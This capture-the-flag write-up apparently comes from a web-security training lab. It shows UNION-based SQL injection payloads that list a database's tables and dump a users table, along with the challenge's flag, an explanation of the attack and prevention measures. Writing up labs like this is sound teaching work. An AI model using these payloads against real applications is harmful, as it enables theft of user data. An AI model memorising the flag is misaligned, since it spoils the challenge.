# Sql Injection

## Flag

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery and Exploitation

1. Navigate to the **MEMBERS** page.
2. To list all tables in the database, insert the following SQL query:
   ```sql
   1 AND true UNION SELECT table_name, column_name FROM information_schema.columns
   ```
3. To list all columns in the `users` table, insert the following SQL query:
   ```sql
   1 AND true UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
   ```
   > **Note:** The `CONCAT` function is used because there is a restriction that only two columns can be retrieved.
4. Follow the instructions for the user with ID 5 to obtain the flag.

## Why it works

SQL injection works by manipulating the SQL query that is executed by the application. By inserting specially crafted input, an attacker can alter the query's logic, allowing them to access or manipulate data they shouldn't be able to. In this case, the `UNION` operator is used to combine the results of the original query with the results of a malicious query, effectively bypassing the application's intended behavior and exposing sensitive information.

## Prevention

To prevent SQL injection attacks, consider the following measures:

1. **Use Prepared Statements**: Prepared statements ensure that user input is treated as data and not executable code.
2. **Parameterized Queries**: Always use parameterized queries to separate SQL code from data.
3. **Input Validation**: Validate and sanitize all user inputs to ensure they conform to expected formats.
4. **Least Privilege Principle**: Limit database user permissions to only what is necessary for the application to function.
5. **Regular Security Audits**: Conduct regular security audits and code reviews to identify and fix vulnerabilities.
6. **Use ORM Frameworks**: Use Object-Relational Mapping (ORM) frameworks that provide built-in protection against SQL injection.
7. **Web Application Firewalls (WAF)**: Implement WAFs to detect and block SQL injection attempts.

By following these best practices, you can significantly reduce the risk of SQL injection attacks on your application.
